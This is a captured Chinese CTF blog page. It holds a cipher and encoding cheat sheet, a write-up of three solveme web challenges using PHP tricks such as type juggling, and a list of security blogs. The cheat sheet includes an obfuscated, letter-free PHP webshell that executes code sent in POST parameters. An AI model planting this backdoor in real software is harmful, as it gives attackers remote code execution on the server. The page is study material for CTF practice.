+<p>++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.</p>
+<p>.+++.——.——–.&gt;+.&gt;.</p>
+</blockquote>
+<p>利用BFVM.exe直接解密</p>
+<p>用法 loadtxt 1.txt</p>
+<p>在线解密：<a href="http://www.splitbrain.org/services/ook" target="_blank" rel="noopener">http://www.splitbrain.org/services/ook</a></p>
+<p>摩斯密码</p>
+<p>密文样例：–  —  .-.  …  .</p>
+<p><a href="http://www.jb51.net/tools/morse.htm" target="_blank" rel="noopener">http://www.jb51.net/tools/morse.htm</a></p>
+<p><a href="http://msjm.yinxiulei.cn/" target="_blank" rel="noopener">http://msjm.yinxiulei.cn/</a></p>
+<p>jsfuck</p>
+<p>密文中 ()[]{}!+</p>
+<p>在线解密：www.jsfuck.com</p>
+<p><a href="http://patriciopalladino.com/files/hieroglyphy/" target="_blank" rel="noopener">http://patriciopalladino.com/files/hieroglyphy/</a></p>
+<p>如果jsfuck定义的是一个函数并且最后以()结尾，则在火狐console中运行时函数也会运行，就会错掉什么提示。这时候需要把最后的()换成.toString()</p>
+<p>如下图的jsfuck，如果直接运行则输出</p>
+<p>换成.toString()则输出全部内容</p>
+<p>培根密码</p>
+<p>培根所用的密码是一种本质上用二进制数设计的。不过，他没有用通常的0和1来表示，而是采用a和b。</p>
+<p>百科：<a href="http://baike.baidu.com/link?url=acaeI3babB7MogPQFh98rDAVSwHfPwh-HnEFTb9cx7DZ5Nz4MkMA14H4SDjBNnOdBsJpliNYa1vnfikQGqvA7K" target="_blank" rel="noopener">http://baike.baidu.com/link?url=acaeI3babB7MogPQFh98rDAVSwHfPwh-HnEFTb9cx7DZ5Nz4MkMA14H4SDjBNnOdBsJpliNYa1vnfikQGqvA7K</a></p>
+<p>已知将一个flag以一种加密形式为使用密钥进行加密，使用密钥WELCOMETOCFF加密后密文为</p>
+<p>培根密码表看其他文件</p>
+<p>费娜姆密码</p>
+<p>异或</p>
+<p>已知将一个flag以一种加密形式为使用密钥进行加密，使用密钥WELCOMETOCFF加密后密文为 00000000000000000000000000000000000</p>
+<p>0000000000000000101110000110001000000101000000001 请分析出flag。</p>
+<p>密钥为12位，密文为84位，可能是异或：</p>
+<p>7位二进制可能表示字母顺序：</p>
+<p>W     E     L     C     O     M    E    T    O     C     F    F</p>
+<p>密文</p>
+<p>0000000 0000000 0000000 0000000 0000000 0000000 0000000 0010111 0000110 0010000 0010100 0000001</p>
+<p>密钥</p>
+<p>0010111 0000101 0001100 0000011 0001111 0001101 0000101 0010100 0001111 0000011 0000110 0000110</p>
+<p>Xor</p>
+<p>0010111 0000101 0001100 0000011 0001111 0001101 0000101 0000011 0001001 0010011 0010010 0000111</p>
+<p>W     E     L     C     O     M    E    C     I     S    R     G</p>
+<p>即：WELCOMECISRG</p>
+<p>flag：WELCOMECISRG</p>
+<p>猪圈密码又称共济会密码</p>
+<p>百度百科：<a href="http://baike.baidu.com/link?url=yN39kWG2pGd9XHo3RjeUAbd7xs0QlnJ2uHzCJfxC03V-fJcQUdfcJ-WuGoAkKGFVE0AxFK4-98wa4FtzvxRA0_" target="_blank" rel="noopener">http://baike.baidu.com/link?url=yN39kWG2pGd9XHo3RjeUAbd7xs0QlnJ2uHzCJfxC03V-fJcQUdfcJ-WuGoAkKGFVE0AxFK4-98wa4FtzvxRA0_</a></p>
+<p>CRC32</p>
+<p>密文样例：4D1FAE0B</p>
+<p>import zlib</p>
+<p>def crc32(st):</p>
+<p>crc = zlib.crc32(st)</p>
+<p>if crc &gt; 0:</p>
+<p>return “%x” % (crc)</p>
+<p>else:</p>
+<p>return “%x” % (~crc ^ 0xffffffff)</p>
+<p>原文链接：<a href="http://blog.csdn.net/ab748998806/article/details/46382017" target="_blank" rel="noopener">http://blog.csdn.net/ab748998806/article/details/46382017</a><br>颜文字加密(aaencode)</p>
+<p>颜文字js加密：明文alert(“flag”);</p>
+<p>密文：?ω??= /｀ｍ′）? ~┻━┻ //<em>′?｀</em>/ [‘<em>‘]; o=(???) =</em>=3; c=(?Θ?) =(???)-(???); (?Д?) =(?Θ?)= (o^<em>^o)/ (o^</em>^o);(?Д?)={?Θ?: ‘<em>‘ ,?ω?? : ((?ω??==3) +‘</em>‘) [?Θ?] ,???? :(?ω??+ ‘<em>‘)[o^</em>^o -(?Θ?)] ,?Д??:((???==3) +‘<em>‘)[???] }; (?Д?) [?Θ?] =((?ω??==3) +‘</em>‘) [c language=”^<em>^o”][/c];(?Д?) [‘c‘] = ((?Д?)+‘</em>‘) [ (???)+(???)-(?Θ?) ];(?Д?) [‘o‘] = ((?Д?)+‘<em>‘) [?Θ?];(?o?)=(?Д?) [‘c‘]+(?Д?) [‘o‘]+(?ω?? +‘</em>‘)[?Θ?]+ ((?ω??==3) +‘<em>‘) [???] + ((?Д?) +‘</em>‘) [(???)+(???)]+ ((???==3) +‘<em>‘) [?Θ?]+((???==3) +‘</em>‘) [(???) - (?Θ?)]+(?Д?) [‘c‘]+((?Д?)+‘<em>‘) [(???)+(???)]+ (?Д?) [‘o‘]+((???==3) +‘</em>‘) [?Θ?];(?Д?) [‘<em>‘] =(o^</em>^o) [?o?] [?o?];(?ε?)=((???==3) +‘<em>‘) [?Θ?]+ (?Д?) .?Д??+((?Д?)+‘</em>‘) [(???) + (???)]+((???==3) +‘<em>‘) [o^</em>^o -?Θ?]+((???==3) +‘<em>‘) [?Θ?]+ (?ω?? +‘</em>‘) [?Θ?]; (???)+=(?Θ?); (?Д?)[?ε?]=‘\‘; (?Д?).?Θ??=(?Д?+ ???)[o^<em>^o -(?Θ?)];(o???o)=(?ω?? +‘</em>‘)[c language=”^<em>^o”][/c];(?Д?) [?o?]=‘\”‘;(?Д?) [‘</em>‘] ( (?Д?) [‘<em>‘] (?ε?+(?Д?)[?o?]+ (?Д?)[?ε?]+(?Θ?)+ (???)+ (?Θ?)+ (?Д?)[?ε?]+(?Θ?)+ ((???) + (?Θ?))+ (???)+ (?Д?)[?ε?]+(?Θ?)+ (???)+ ((???) + (?Θ?))+ (?Д?)[?ε?]+(?Θ?)+ ((o^</em>^o) +(o^<em>^o))+ ((o^</em>^o) - (?Θ?))+ (?Д?)[?ε?]+(?Θ?)+ ((o^<em>^o) +(o^</em>^o))+ (???)+ (?Д?)[?ε?]+((???) + (?Θ?))+ (c^<em>^o)+ (?Д?)[?ε?]+(???)+ ((o^</em>^o) - (?Θ?))+ (?Д?)[?ε?]+(?Θ?)+ (???)+ ((o^<em>^o) +(o^</em>^o))+ (?Д?)[?ε?]+(?Θ?)+ ((???) + (?Θ?))+ (???)+ (?Д?)[?ε?]+(?Θ?)+ (???)+ (?Θ?)+ (?Д?)[?ε?]+(?Θ?)+ (???)+ ((???) + (o^<em>^o))+ (?Д?)[?ε?]+(???)+ ((o^</em>^o) - (?Θ?))+ (?Д?)[?ε?]+((???) + (?Θ?))+ (?Θ?)+ (?Д?)[?ε?]+((???) + (o^<em>^o))+ (o^</em>^o)+ (?Д?)[?o?]) (?Θ?)) (‘_‘);<br>解密：<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="noopener">http://utf-8.jp/public/aaencode.html</a><br>Jjencode</p>
+<p>密文：$=~[];$={<strong>_:++$,$$$$:(![]+””)[$],</strong>$:++$,$<em>$</em>:(![]+””)[$],<em>$</em>:++$,$<em>$$:({}+””)[$],$$</em>$:($[$]+””)[$],<em>$$:++$,$$$</em>:(!””+””)[$],$<strong>:++$,$_$:++$,$$</strong>:({}+””)[$],$$<em>:++$,$$$:++$,$__</em>:++$,$<strong>$:++$};$.$<em>=($.$</em>=$+””)[$.$<em>$]+($.</em>$=$.$_[$.</strong>$])+($.$$=($.$+””)[$.<strong>$])+((!$)+””)[$._$$]+($.</strong>=$.$<em>[$.$$</em>])+($.$=(!””+””)[$.<strong>$])+($.<em>=(!””+””)[$.</em>$<em>])+$.$</em>[$.$_$]+$.</strong>+$.<em>$+$.$;$.$$=$.$+(!””+””)[$.</em>$$]+$.<strong>+$.<em>+$.$+$.$$;$.$=($.</em></strong>)[$.$<em>][$.$</em>];$.$($.$($.$$+”\””+$.$<em>$</em>+(![]+””)[$.<em>$</em>]+$.$$$<em>+”\“+$.__$+$.$$</em>+$.<em>$</em>+$.<strong>+”(\\”\“+$.</strong>$+$.<strong>$+$._</strong>+$.$$$<em>+(![]+””)[$.</em>$<em>]+(![]+””)[$.</em>$<em>]+$.</em>$+”,\“+$.$<strong>+$._</strong>+”\“+$.<strong>$+$.</strong>$+$.<em>$</em>+$.$<em>$</em>+”\“+$.<strong>$+$.$$<em>+$.$$</em>+$.$<em>$</em>+”\“+$.</strong>$+$.<em>$</em>+$.<em>$$+$.$$<strong>+”\“+$.</strong>$+$.$$</em>+$.<em>$</em>+”\“+$.<strong>$+$.$_$+$.</strong>$+”\“+$.<strong>$+$.$$<em>+$.</em></strong>+$.<strong>+”\\”\“+$.$</strong>+$.___+”)”+”\””)())();</p>
+<p>解密地址：<a href="http://utf-8.jp/public/jjencode.html?src=&amp;var=%24" target="_blank" rel="noopener">http://utf-8.jp/public/jjencode.html?src=&amp;var=%24</a><br>无字母加密</p>
+<p>&lt;?php</p>
+<p>@$<em>++; // $</em> = 1</p>
+<p>$<strong>=(“#”^”|”); // $</strong> = _</p>
+<p>$__.=(“.”^”~”); // _P</p>
+<p>$__.=(“/“^”`”); // _PO</p>
+<p>$__.=(“|”^”/“); // _POS</p>
+<p>$__.=(“{“^”/“); // _POST</p>
+<p>${$<strong>}[!$_](${$</strong>}[$_]); // $_POST<a href="$_POST[1]">0</a>;</p>
+<p>?&gt;</p>
+<p><a href="http://www.waitalone.cn/php-backdoor.html" target="_blank" rel="noopener">http://www.waitalone.cn/php-backdoor.html</a></p>
+<p>Utf-7编解码</p>
+<p>原文：gdfgdfg</p>
+<p>密文：+AGcAZABmAGcAZABmAGc-</p>
+<p>无论何种，都是+开头-结尾</p>
+<p><a href="http://tomeko.net/online_tools/base32.php?lang=en" target="_blank" rel="noopener">http://tomeko.net/online_tools/base32.php?lang=en</a></p>
+<p>对于其他一些未知密文，可尝试到下列几个网站转换试试，看看运气</p>
+<p><a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="noopener">http://web.chacuo.net/charsetuuencode</a></p>
+<p><a href="http://blog.csdn.net/ab748998806/article/details/46368337" target="_blank" rel="noopener">http://blog.csdn.net/ab748998806/article/details/46368337</a></p>
+<p><a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/wenbenjiami.php</a></p>
+<p>1如果密文是十进制，字符范围为“0-9”，可以猜测是ASCII编码；</p>
+<p>2如果密文由“a-z”“A-Z”和“=”构成，特别是末尾有“=”，那么可以判断为Base64编码；</p>
+<p>3如果密文含有“%” ，形式为 “%xx” 和 “%uxxxx”，字符范围又是十六进制“0-F”，判断是escape() 函数编码，用unescape()解码；</p>
+<p>4若密文由“[]，()，{}，+,！”字符组成的编码通常就通过Jother解密。</p>
+<p>判断出可能的编码方式，就可以使用程序或工具进行解密。</p>
+<p>云影密码</p>
+<p>如果密码只有01248组成</p>
+<p>此密码运用了1248代码，因为本人才疏学浅，尚未发现有过使用的先例，因此暂归为原创密码，若有密码界前辈认为不妥，请指出此密码或类似密码的普遍使用历史并附寄一份到我站内邮箱，我将以最快速度核查并改正。由于这个密码，我和片风云影初识，为了纪念，将其命名为“云影密码”，原文请见谜题大全精华区。</p>
+<p>原理很简单，有了1，2，4，8这四个简单的数字，你可以以加法表示出0-9任何一个数字，例如0=28，7=124，9=18。</p>
+<p>这样，再用1-26来表示A-Z，就可以用作密码了。</p>
+<p>为了不至于混乱，我个人引入了第五个数字0，来用作间隔，以避免翻译错误，所以还可以称“01248密码”。</p>
+<p>题目：12401011801180212011401804</p>
+<p>第一步，分割，即124  1  118  118  212  114  18  4</p>
+<p>第二步，基本翻译，例如124可以表示7，也可以表示16（但不可能是34，因为不会超过26），所以可以放在一边，翻译其他没有异议的，可得：124  a  s  s  w  o  18  d</p>
+<p>第三步，推测得出明文。可以推测后面的18表示r，前面的为p最合适。</p>
+<p>明文：password（密码）.</p>
+<p>RC4</p>
+<p>key welcometoicqedu</p>
+<p>密文UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw==</p>
+<p>用脚本解密 脚本已存</p>
+<p>曼彻斯特</p>
+<p>转二进制 不是10就是01 即是曼彻斯特 解密看脚本</p>
+<p>查看原文：<a href="http://www.am0s.com/ctf/179.html" target="_blank" rel="noopener">http://www.am0s.com/ctf/179.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/29/solvetime/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BoBo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BoBo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/29/solvetime/" itemprop="url"><font color="#dd0000"><font size="7">solveme解析</font><br /></font><br /></a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-29T19:18:54+08:00">
+                2018-03-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><font size="6">网址:<a href="http://solveme.peng.kr/" target="_blank" rel="noopener">http://solveme.peng.kr/</a></font><br></p>
+<p><font size="5">1、warmup</font><br><br><img src="/2018/03/29/solvetime/warmup.jpg" alt=" "><br>首先看到题目给了个base64的代码<br>php小白一点点查出来各个函数<br><code>base64_encode</code>这个是加密base64<br><code>hex2bin</code>这个是把16进制的值转化为ASCII<br><code>bin2hex</code>是把ASCII转化为十六进制<br><code>strrev（）</code>这个函数是把所有字符反向输出<br>根据题目可以写出脚本反解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$flag = &quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&quot;;</span><br><span class="line">echo hex2bin(strrev(bin2hex(base64_decode($flag))));</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><br>得到<code>flag{582a0f2c7e302244b110cc461f5cb100}</code></p>
+<p><font size="5">2、badcompare</font><br><br><img src="/2018/03/29/solvetime/badcompare.jpg" alt=" "><br>继续看函数~<br><code>isset</code>是判断一个变量是否定义过,即使它没有值,返回值也是true.<br>这个题的大概意思就是要让<code>answer=роВхУъесЧМ</code>如果直接复制就会报错所以需要转码一下，但这些都不是常见的ASCII码所以用python跑一下<br>但是殷大佬突然告诉我用burp抓一下包（如下图）然后写个脚本或者手动加百分号就行，原理就是url编码的本身就是%对应字符的十六进制。<br><img src="/2018/03/29/solvetime/badcompare2.jpg" alt=" "><br>最终结果<code>%f0%ee%c2%f5%d3%fa%e5%f1%d7%cc</code><br>payload:<code>http://badcompare.solveme.peng.kr/?answer=%f0%ee%c2%f5%d3%fa%e5%f1%d7%cc</code><br><code>flag{446c7b68ad824cd9c1df87158717aa2b}</code></p>
+<p><font size="5">3、wintersleep</font><br><br><img src="/2018/03/29/solvetime/wintersleep.jpg" alt=" "><br>这个题大概阅读一下源码意思就是要输入一个数（time）介于60<em>60</em>24<em>30</em>2和60<em>60</em>24<em>30</em>3之间，首先我们算一下，这两个答案分别是5184000和7776000。<br>这之间的数很多，但你如果输入以后网页就会延时你输入的那么长时间，岂不是gg<br>所以看了一叶大佬的博客发现是弱比较<br>贴代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo 60 * 60 * 24 * 30 * 2;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo 7e6;</span><br><span class="line">echo (int)&apos;7e6&apos;;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo 60 * 60 * 24 * 30 * 3;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><br>输出结果是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">5184000</span><br><span class="line">7000000</span><br><span class="line">7</span><br><span class="line">7776000</span><br></pre></td></tr></table></figure><br>利用了一下类型转换的漏洞，7e6在两个数之间，然后sleep他先将7e6转成int型，变成了7，等7s就会回显flag.<br><code>flag{2d4e9b6608efb8088abb2345ef2f7b90}</code></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/28/ganhuo/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BoBo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BoBo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/03/28/ganhuo/" itemprop="url">一大批干货</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-28T09:27:18+08:00">
+                2018-03-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>积累了不少干货，贴出来造福人类~<br>有的网址需要扶墙，有的自测可用<br>个人技术博客：<br>国内：<br><a href="http://blog.csdn.net/qq_27446553/" target="_blank" rel="noopener">http://blog.csdn.net/qq_27446553/</a> （qq_27446553博客）</p>
+<p><a href="http://0x007.blog.51cto.com/6330498/1628943" target="_blank" rel="noopener">http://0x007.blog.51cto.com/6330498/1628943</a> （0x007博客）</p>
+<p><a href="http://www.kavsec.com/" target="_blank" rel="noopener">http://www.kavsec.com/</a> (kavsec博客）</p>
+<p><a href="http://www.lorexxar.cn/（lorexxar博客" target="_blank" rel="noopener">http://www.lorexxar.cn/（lorexxar博客</a>)</p>
+<p><a href="http://www.test404.com/（test404博客）" target="_blank" rel="noopener">http://www.test404.com/（test404博客）</a></p>
+<p><a href="https://evi1cg.me/（evilcg博客）" target="_blank" rel="noopener">https://evi1cg.me/（evilcg博客）</a></p>
+<p><a href="http://ver007.com/（ver007博客）" target="_blank" rel="noopener">http://ver007.com/（ver007博客）</a></p>
+<p><a href="http://cciezsm.lofter.com/（颖奇博客）" target="_blank" rel="noopener">http://cciezsm.lofter.com/（颖奇博客）</a></p>
+<p><a href="http://www.secsky.cn/（安全天空博客）" target="_blank" rel="noopener">http://www.secsky.cn/（安全天空博客）</a></p>
+<p><a href="https://www.hackfun.org/（4ido1on博客）" target="_blank" rel="noopener">https://www.hackfun.org/（4ido1on博客）</a></p>
+<p><a href="http://helloeveryone.blog.51cto.com/（牛磊博客" target="_blank" rel="noopener">http://helloeveryone.blog.51cto.com/（牛磊博客</a>)</p>
+<p><a href="http://www.7kb.org/(7kb论坛" target="_blank" rel="noopener">http://www.7kb.org/(7kb论坛</a>)</p>
+<p><a href="http://lu4n.com/（lun博客）" target="_blank" rel="noopener">http://lu4n.com/（lun博客）</a></p>
+<p><a href="http://www.cnbraid.com/（cnbiraid博客）" target="_blank" rel="noopener">http://www.cnbraid.com/（cnbiraid博客）</a></p>
+<p><a href="http://blog.neargle.com（neargle博客" target="_blank" rel="noopener">http://blog.neargle.com（neargle博客</a>)</p>
+<p><a href="https://lightrains.org（lightrains博客" target="_blank" rel="noopener">https://lightrains.org（lightrains博客</a>)</p>
+<p><a href="https://imlonghao.com/（imlonghao博客）" target="_blank" rel="noopener">https://imlonghao.com/（imlonghao博客）</a></p>
+<p><a href="http://www.zerokeeper.com/（zerokeeper博客）" target="_blank" rel="noopener">http://www.zerokeeper.com/（zerokeeper博客）</a></p>
+<p><a href="http://www.thinkings.org/（thinkings博客）" target="_blank" rel="noopener">http://www.thinkings.org/（thinkings博客）</a></p>
+<p><a href="https://www.ohlinge.cn/" target="_blank" rel="noopener">https://www.ohlinge.cn/</a> （ohlinge博客）</p>
+<p><a href="https://www.virzz.com" target="_blank" rel="noopener">https://www.virzz.com</a> （virzz博客)</p>
+<p><a href="https://www.jisec.com/" target="_blank" rel="noopener">https://www.jisec.com/</a> (jisec博客)</p>
+<p><a href="http://www.hfhuge.com/（hfhuge博客）" target="_blank" rel="noopener">http://www.hfhuge.com/（hfhuge博客）</a></p>
+<p><a href="http://www.91ri.org/（91ri博客" target="_blank" rel="noopener">http://www.91ri.org/（91ri博客</a>)</p>
+<p><a href="http://www.codersec.net" target="_blank" rel="noopener">http://www.codersec.net</a> (codersec博客)</p>
+<p><a href="http://www.venenof.com/（venenof博客）" target="_blank" rel="noopener">http://www.venenof.com/（venenof博客）</a></p>
+<p><a href="http://blog.leanote.com/thorns（leanote博客）" target="_blank" rel="noopener">http://blog.leanote.com/thorns（leanote博客）</a></p>
+<p><a href="http://www.droidsec.cn/（安卓中文博客" target="_blank" rel="noopener">http://www.droidsec.cn/（安卓中文博客</a> ）</p>
+<p><a href="http://linux.im/（im博客）" target="_blank" rel="noopener">http://linux.im/（im博客）</a></p>
+<p><a href="https://www.iswin.org/（飓风博客）" target="_blank" rel="noopener">https://www.iswin.org/（飓风博客）</a></p>
+<p><a href="http://www.shentou.org/" target="_blank" rel="noopener">http://www.shentou.org/</a> （安全渗透军火库博客）</p>
+<p><a href="http://joychou.org" target="_blank" rel="noopener">http://joychou.org</a> (joychou博客)</p>
+<p><a href="http://0cx.cc/" target="_blank" rel="noopener">http://0cx.cc/</a> (0cx博客)</p>
+<p><a href="http://hacktech.cn/（hacketech博客）" target="_blank" rel="noopener">http://hacktech.cn/（hacketech博客）</a></p>
+<p><a href="http://www.lucien116.com（lucien博客）" target="_blank" rel="noopener">http://www.lucien116.com（lucien博客）</a></p>
+<p><a href="http://www.hack1990.com（hack1990博客）" target="_blank" rel="noopener">http://www.hack1990.com（hack1990博客）</a></p>
+<p><a href="http://www.xmanblog.net/（xmanblog博客）" target="_blank" rel="noopener">http://www.xmanblog.net/（xmanblog博客）</a></p>
+<p><a href="http://xia0yu.win/（xia0yu博客）" target="_blank" rel="noopener">http://xia0yu.win/（xia0yu博客）</a></p>
+<p><a href="http://littlehann.cnblogs.com/" target="_blank" rel="noopener">http://littlehann.cnblogs.com/</a> （littlehann博客）</p>
+<p><a href="http://lonelyrain.me/（lonelyrain博客）" target="_blank" rel="noopener">http://lonelyrain.me/（lonelyrain博客）</a></p>
+<p><a href="http://www.hack-gov.com（hack-gov博客）" target="_blank" rel="noopener">http://www.hack-gov.com（hack-gov博客）</a></p>
+<p><a href="http://xdxd.love/（xdxd博客）" target="_blank" rel="noopener">http://xdxd.love/（xdxd博客）</a></p>
+<p><a href="https://www.lynahex.com/（lynahex博客）" target="_blank" rel="noopener">https://www.lynahex.com/（lynahex博客）</a></p>
+<p><a href="http://www.cnblogs.com/S4b0r/（S4b0r博客）" target="_blank" rel="noopener">http://www.cnblogs.com/S4b0r/（S4b0r博客）</a></p>
+<p><a href="http://www.leesec.com/（leesce博客）" target="_blank" rel="noopener">http://www.leesec.com/（leesce博客）</a></p>
+<p><a href="https://bl4ck.in/（b14ck博客）" target="_blank" rel="noopener">https://bl4ck.in/（b14ck博客）</a></p>
+<p><a href="http://www.hksafe.cn.com" target="_blank" rel="noopener">http://www.hksafe.cn.com</a> (hksafe博客)</p>
+<p><a href="http://www.n0tr00t.com/（n0tr00t博客）" target="_blank" rel="noopener">http://www.n0tr00t.com/（n0tr00t博客）</a></p>
+<p><a href="https://www.92aq.com/（92工具博客）" target="_blank" rel="noopener">https://www.92aq.com/（92工具博客）</a></p>
+<p><a href="https://3gstudent.github.io/(三好学生博客）" target="_blank" rel="noopener">https://3gstudent.github.io/(三好学生博客）</a></p>
+<p><a href="http://www.nxadmin.com/（" target="_blank" rel="noopener">http://www.nxadmin.com/（</a> nxadmin博客 ）</p>
+<p><a href="https://www.leavesongs.com/（" target="_blank" rel="noopener">https://www.leavesongs.com/（</a> p牛代码审计博客 ）</p>
+<p><a href="http://www.code521.com/（code521博客）" target="_blank" rel="noopener">http://www.code521.com/（code521博客）</a></p>
+<p><a href="http://p2j.cn/(" target="_blank" rel="noopener">http://p2j.cn/(</a> 园长博客)</p>
+<p><a href="http://le4f.net/（le4f博客）" target="_blank" rel="noopener">http://le4f.net/（le4f博客）</a></p>
+<p><a href="http://www.polaris-lab.com/" target="_blank" rel="noopener">http://www.polaris-lab.com/</a> (polaris-lab实验室)</p>
+<p><a href="http://www.programlife.net/（程序人生博客）" target="_blank" rel="noopener">http://www.programlife.net/（程序人生博客）</a></p>
+<p><a href="http://evilcos.me/(余玄博客" target="_blank" rel="noopener">http://evilcos.me/(余玄博客</a>)</p>
+<p><a href="https://www.blackh4t.org/" target="_blank" rel="noopener">https://www.blackh4t.org/</a> （blackh4t博客）</p>
+<p><a href="http://www.bugsec.org/tools" target="_blank" rel="noopener">http://www.bugsec.org/tools</a> (bugsec博客)</p>
+<p><a href="http://ecma.io/（ecma博客）" target="_blank" rel="noopener">http://ecma.io/（ecma博客）</a></p>
+<p><a href="http://www.meijj.org/" target="_blank" rel="noopener">http://www.meijj.org/</a> (meijj博客)</p>
+<p><a href="https://ricterz.me/（ricterz博客）" target="_blank" rel="noopener">https://ricterz.me/（ricterz博客）</a></p>
+<p><a href="http://yaseng.org（yaseng博客）" target="_blank" rel="noopener">http://yaseng.org（yaseng博客）</a></p>
+<p><a href="http://avfisher.win/（安全小飞侠博客）" target="_blank" rel="noopener">http://avfisher.win/（安全小飞侠博客）</a></p>
+<p><a href="http://www.0xmh.com/（0xmh博客）" target="_blank" rel="noopener">http://www.0xmh.com/（0xmh博客）</a></p>
+<p><a href="http://www.lijiejie.com/（lijiejie博客）" target="_blank" rel="noopener">http://www.lijiejie.com/（lijiejie博客）</a></p>
+<p><a href="http://secoff.net/（secoff博客）" target="_blank" rel="noopener">http://secoff.net/（secoff博客）</a></p>
+<p><a href="http://twi1ight.com/（twi1ight博客）" target="_blank" rel="noopener">http://twi1ight.com/（twi1ight博客）</a></p>
+<p><a href="https://rinige.com" target="_blank" rel="noopener">https://rinige.com</a> (ringige博客)</p>
+<p><a href="http://www.bystudent.com/(bystudent博客" target="_blank" rel="noopener">http://www.bystudent.com/(bystudent博客</a>)</p>
+<p><a href="http://o0xmuhe.me/page/2/" target="_blank" rel="noopener">http://o0xmuhe.me/page/2/</a> (o0xmuhe博客)</p>
+<p><a href="http://www.blue-lotus.net/" target="_blank" rel="noopener">http://www.blue-lotus.net/</a> （蓝莲花战队博客）</p>
+<p><a href="https://www.webshell.cc/(" target="_blank" rel="noopener">https://www.webshell.cc/(</a> webshell博客)</p>
+<p><a href="http://appleu0.sinaapp.com/(" target="_blank" rel="noopener">http://appleu0.sinaapp.com/(</a> appleu0博客)</p>
+<p><a href="http://www.lshack.cn/" target="_blank" rel="noopener">http://www.lshack.cn/</a> (lshack博客)</p>
+<p><a href="https://phpinfo.me/" target="_blank" rel="noopener">https://phpinfo.me/</a> ( phpinfo博客)</p>
+<p><a href="http://f4le.com/" target="_blank" rel="noopener">http://f4le.com/</a> ( f4le博客)</p>
+<p><a href="http://www.03sec.com/" target="_blank" rel="noopener">http://www.03sec.com/</a> (03sec博客)</p>
+<p><a href="http://www.cnbraid.com/（cnbradid博客）" target="_blank" rel="noopener">http://www.cnbraid.com/（cnbradid博客）</a></p>
+<p><a href="http://www.cnblogs.com/killbit/（killbit博客）" target="_blank" rel="noopener">http://www.cnblogs.com/killbit/（killbit博客）</a></p>
+<p><a href="http://blog.nuptzj.cn/" target="_blank" rel="noopener">http://blog.nuptzj.cn/</a> (nuptzj博客)</p>
